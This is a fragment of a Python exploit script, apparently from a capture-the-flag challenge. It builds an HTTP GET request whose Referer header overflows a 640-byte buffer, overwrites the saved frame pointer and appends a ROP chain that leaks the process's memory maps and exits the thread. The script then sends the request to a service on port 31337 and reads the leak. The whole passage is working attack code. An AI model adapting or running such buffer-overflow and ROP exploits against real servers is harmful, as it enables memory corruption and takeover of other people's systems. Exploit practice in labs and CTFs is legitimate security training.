msg1 = b'GET /asdf.vbs HTTP/1.1\r\n'
msg1 += b'Referer:'
                    
x = b""
x += b'A' * (640 - len(x)) 	#fill up the rest of the 640 byte buffer
x += b'\xFF'* 8	#overwrite EBP

# build rop chain to do a peak, and then exit the thread

x += struct.pack("Q", LOCAL_POP_RDI_RET)
x += struct.pack("Q", 4)    # hope/spam till this works
                            # alternatively we could spray a ton of connections without sending the GET, and then make it write to a reliable fd #
x += struct.pack("Q", DEBUG_MAPS_FUNC)
x += struct.pack("Q", LOCAL_POP_RDI_RET)
x += struct.pack("Q", 4)
x += struct.pack("Q", CLOSE)
x += struct.pack("Q", LOCAL_POP_RDI_RET)
x += struct.pack("Q", 60) # do an exit (only thread, not group)
x += struct.pack("Q", SYSCALL)
    
msg1 += urllib.parse.quote(x).encode()
    
msg1 += b'\r\n\r\n'
    
s = socket(AF_INET, SOCK_STREAM)
s.connect((addr, 31337))
s.send(msg1)

# get the response
resp = b""
key = b"running with maps "
while key not in resp:
    resp += s.recv(0x1000)
